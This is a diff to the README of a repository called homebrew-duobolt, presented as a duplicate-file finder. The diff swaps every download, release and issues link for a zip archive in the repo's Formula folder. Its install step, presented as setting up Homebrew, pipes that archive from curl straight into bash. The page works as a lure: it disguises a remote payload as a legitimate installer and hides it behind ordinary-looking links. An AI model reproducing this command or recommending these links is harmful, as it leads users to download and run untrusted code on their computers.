@@ -6,9 +6,9 @@ Welcome to the homebrew-duobolt repository! This tool helps you quickly find dup
 
 ## 📥 Download
 
-[![Download homebrew-duobolt](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip%20homebrew--duobolt-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip)
+[![Download homebrew-duobolt](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip%20homebrew--duobolt-v1.0.0-brightgreen)](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)
 
-You can download homebrew-duobolt by visiting our [Releases page](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip). This page includes all available versions of the software.
+You can download homebrew-duobolt by visiting our [Releases page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip). This page includes all available versions of the software.
 
 ## 💡 Features
 
@@ -32,7 +32,7 @@ To use homebrew-duobolt, you need:
 If you do not have Homebrew installed, you can do so by opening your terminal and running:
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip)"
+/bin/bash -c "$(curl -fsSL https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)"
 ```
 
 This will guide you through the Homebrew installation process.
@@ -89,7 +89,7 @@ duobolt --help
 
 ## 💬 Support
 
-If you encounter any issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip) to seek help or report any bugs. We appreciate your feedback, as it helps us improve the application.
+If you encounter any issues or have questions, please visit our [Issues page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip) to seek help or report any bugs. We appreciate your feedback, as it helps us improve the application.
 
 ## 🌟 Contributing
 
@@ -101,7 +101,7 @@ homebrew-duobolt is open-source software. You can freely use and modify it accor
 
 ## 🌐 Links
 
-- [Releases Page](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip)
-- [Issues Page](https://raw.githubusercontent.com/Piyushdalai/homebrew-duobolt/main/Formula/homebrew-duobolt-v1.5.zip)
+- [Releases Page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)
+- [Issues Page](https://github.com/Piyushdalai/homebrew-duobolt/raw/refs/heads/main/Formula/homebrew_duobolt_1.3.zip)
 
 Thank you for using homebrew-duobolt! Enjoy your cleaner, more organized files!
